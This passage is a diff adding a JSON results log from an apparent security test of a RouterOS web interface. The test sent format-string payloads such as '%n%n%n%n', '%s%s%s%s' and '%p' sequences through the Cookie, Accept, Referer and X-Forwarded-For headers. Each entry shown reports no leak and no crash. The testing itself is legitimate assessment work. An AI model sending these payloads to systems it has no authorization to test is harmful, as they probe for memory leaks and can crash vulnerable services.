+      "description": "Cookie: direct_param_access",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:54.737411",
+      "details": {
+        "header": "Cookie",
+        "payload_name": "direct_param_access",
+        "payload_value": "AAAA%1$x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:50 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 31,
+      "category": "header_format_string",
+      "name": "header_Accept_info_leak_hex",
+      "description": "Accept: info_leak_hex",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:55.045565",
+      "details": {
+        "header": "Accept",
+        "payload_name": "info_leak_hex",
+        "payload_value": "%x%x%x%x%x%x%x%x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:50 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 32,
+      "category": "header_format_string",
+      "name": "header_Accept_info_leak_ptr",
+      "description": "Accept: info_leak_ptr",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:55.349717",
+      "details": {
+        "header": "Accept",
+        "payload_name": "info_leak_ptr",
+        "payload_value": "%p%p%p%p%p%p%p%p",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:50 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 33,
+      "category": "header_format_string",
+      "name": "header_Accept_crash_deref",
+      "description": "Accept: crash_deref",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:56.154119",
+      "details": {
+        "header": "Accept",
+        "payload_name": "crash_deref",
+        "payload_value": "%s%s%s%s",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:51 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 34,
+      "category": "header_format_string",
+      "name": "header_Accept_write_test",
+      "description": "Accept: write_test",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:08.011039",
+      "details": {
+        "header": "Accept",
+        "payload_name": "write_test",
+        "payload_value": "%n%n%n%n",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:02 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        },
+        "crash_check": {
+          "crash": false,
+          "pre_uptime": "2h10m34s",
+          "post_uptime": "2h10m45s"
+        }
+      }
+    },
+    {
+      "id": 35,
+      "category": "header_format_string",
+      "name": "header_Accept_structured_leak",
+      "description": "Accept: structured_leak",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:08.334877",
+      "details": {
+        "header": "Accept",
+        "payload_name": "structured_leak",
+        "payload_value": "%08x.%08x.%08x.%08x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:03 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 36,
+      "category": "header_format_string",
+      "name": "header_Accept_direct_param_access",
+      "description": "Accept: direct_param_access",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:08.658715",
+      "details": {
+        "header": "Accept",
+        "payload_name": "direct_param_access",
+        "payload_value": "AAAA%1$x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:04 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 37,
+      "category": "header_format_string",
+      "name": "header_Referer_info_leak_hex",
+      "description": "Referer: info_leak_hex",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:08.986551",
+      "details": {
+        "header": "Referer",
+        "payload_name": "info_leak_hex",
+        "payload_value": "%x%x%x%x%x%x%x%x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:04 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 38,
+      "category": "header_format_string",
+      "name": "header_Referer_info_leak_ptr",
+      "description": "Referer: info_leak_ptr",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:09.302393",
+      "details": {
+        "header": "Referer",
+        "payload_name": "info_leak_ptr",
+        "payload_value": "%p%p%p%p%p%p%p%p",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:04 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 39,
+      "category": "header_format_string",
+      "name": "header_Referer_crash_deref",
+      "description": "Referer: crash_deref",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:10.149969",
+      "details": {
+        "header": "Referer",
+        "payload_name": "crash_deref",
+        "payload_value": "%s%s%s%s",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:05 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 40,
+      "category": "header_format_string",
+      "name": "header_Referer_write_test",
+      "description": "Referer: write_test",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:21.996043",
+      "details": {
+        "header": "Referer",
+        "payload_name": "write_test",
+        "payload_value": "%n%n%n%n",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:16 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        },
+        "crash_check": {
+          "crash": false,
+          "pre_uptime": "2h10m48s",
+          "post_uptime": "2h10m59s"
+        }
+      }
+    },
+    {
+      "id": 41,
+      "category": "header_format_string",
+      "name": "header_Referer_structured_leak",
+      "description": "Referer: structured_leak",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:22.311885",
+      "details": {
+        "header": "Referer",
+        "payload_name": "structured_leak",
+        "payload_value": "%08x.%08x.%08x.%08x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:17 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 42,
+      "category": "header_format_string",
+      "name": "header_Referer_direct_param_access",
+      "description": "Referer: direct_param_access",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:22.635723",
+      "details": {
+        "header": "Referer",
+        "payload_name": "direct_param_access",
+        "payload_value": "AAAA%1$x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:18 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 43,
+      "category": "header_format_string",
+      "name": "header_X-Forwarded-For_info_leak_hex",
+      "description": "X-Forwarded-For: info_leak_hex",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:22.955563",
+      "details": {
+        "header": "X-Forwarded-For",
+        "payload_name": "info_leak_hex",
+        "payload_value": "%x%x%x%x%x%x%x%x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:18 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 44,
+      "category": "header_format_string",
+      "name": "header_X-Forwarded-For_info_leak_ptr",
+      "description": "X-Forwarded-For: info_leak_ptr",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:10:23.275403",
+      "details": {
+        "header": "X-Forwarded-For",
+        "payload_name": "info_leak_ptr",
+        "payload_value": "%p%p%p%p%p%p%p%p",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:50:18 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
